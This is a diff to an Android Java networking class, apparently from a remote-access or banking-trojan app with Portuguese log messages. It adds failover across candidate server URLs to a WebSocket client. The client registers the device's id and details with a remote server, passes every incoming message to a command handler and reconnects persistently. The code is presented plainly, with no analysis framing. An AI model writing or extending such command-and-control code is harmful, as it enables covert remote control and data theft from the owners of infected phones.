@@ -3,11 +3,15 @@ package com.aval.seg;
 import android.content.Context;
 import android.os.Handler;
 import android.os.Looper;
+import android.util.Log;
 
 import org.java_websocket.client.WebSocketClient;
 import org.java_websocket.handshake.ServerHandshake;
 
 import java.net.URI;
+import java.util.List;
+import java.util.concurrent.CountDownLatch;
+import java.util.concurrent.TimeUnit;
 import java.util.concurrent.atomic.AtomicBoolean;
 
 public final class Net {
@@ -16,38 +20,66 @@ public final class Net {
     private static final AtomicBoolean busy = new AtomicBoolean();
     private static volatile int fails;
 
-    public static synchronized void start(final Context c) {
+    public static void start(final Context c) {
         if (busy.get() || (ws != null && ws.isOpen())) return;
-        busy.set(true);
+        if (!busy.compareAndSet(false, true)) return;
         new Thread(() -> {
+            boolean ok = false;
             try {
-                final String url = Util.bootstrap(c);
-                ws = new WebSocketClient(URI.create(url)) {
-                    @Override public void onOpen(ServerHandshake h) {
-                        busy.set(false);
-                        fails = 0;
-                        send("{\"t\":\"hello\",\"id\":\"" + Cfg.id(c) + "\"," + Util.dev(c) + "}");
-                    }
-                    @Override public void onMessage(String m) { Cmd.handle(c, m); }
-                    @Override public void onClose(int code, String r, boolean remote) {
-                        busy.set(false);
-                        H.postDelayed(() -> start(c), backoff());
-                    }
-                    @Override public void onError(Exception e) { busy.set(false); }
-                };
-                ws.setConnectionLostTimeout(20);
-                ws.connectBlocking();
+                List<String> urls = Util.candidates(c);
+                Log.d("aval", "candidatos: " + urls);
+                for (String u : urls) {
+                    if (tryConnect(c, u)) { ok = true; break; }
+                }
             } catch (Throwable t) {
-                busy.set(false);
-                H.postDelayed(() -> start(c), backoff());
+                Log.d("aval", "start: " + t);
             }
+            busy.set(false);
+            if (!ok) H.postDelayed(() -> start(c), backoff());
         }).start();
+    }
+
+    private static boolean tryConnect(final Context c, final String url) {
+        final CountDownLatch latch = new CountDownLatch(1);
+        final AtomicBoolean up = new AtomicBoolean();
+        try {
+            WebSocketClient w = new WebSocketClient(URI.create(url)) {
+                @Override public void onOpen(ServerHandshake h) {
+                    up.set(true);
+                    fails = 0;
+                    Util.remember(c, url);
+                    Log.d("aval", "aberto em " + url);
+                    send("{\"t\":\"hello\",\"id\":\"" + Cfg.id(c) + "\"," + Util.dev(c) + "}");
+                    latch.countDown();
+                }
+                @Override public void onMessage(String m) { Cmd.handle(c, m); }
+                @Override public void onClose(int code, String r, boolean remote) {
+                    Log.d("aval", "close " + code + " " + r + " " + url);
+                    if (ws != this) return;
+                    H.postDelayed(() -> start(c), backoff());
+                }
+                @Override public void onError(Exception e) {
+                    Log.d("aval", "err " + e + " " + url);
+                    latch.countDown();
+                }
+            };
+            w.setConnectionLostTimeout(20);
+            w.connect();
+            if (!latch.await(6, TimeUnit.SECONDS) || !up.get()) {
+                try { w.close(); } catch (Throwable ignored) {}
+                return false;
+            }
+            ws = w;
+            return true;
+        } catch (Throwable t) {
+            Log.d("aval", "falhou " + url + ": " + t);
+            return false;
+        }
     }
 
     private static long backoff() {
         fails = Math.min(fails + 1, 6);
-        long base = 3000L * fails;
-        return base + (long) (Math.random() * 1500);
+        return 2500L * fails + (long) (Math.random() * 1200);
     }
 
     public static void send(String s) {
@@ -61,7 +93,7 @@ public final class Net {
         try {
             WebSocketClient w = ws;
             if (w == null || !w.isOpen()) return;
-            if (w.hasBufferedData()) return;   // nao acumula frame se a rede travou
+            if (w.hasBufferedData()) return;
             w.send(b);
         } catch (Throwable ignored) {}
     }
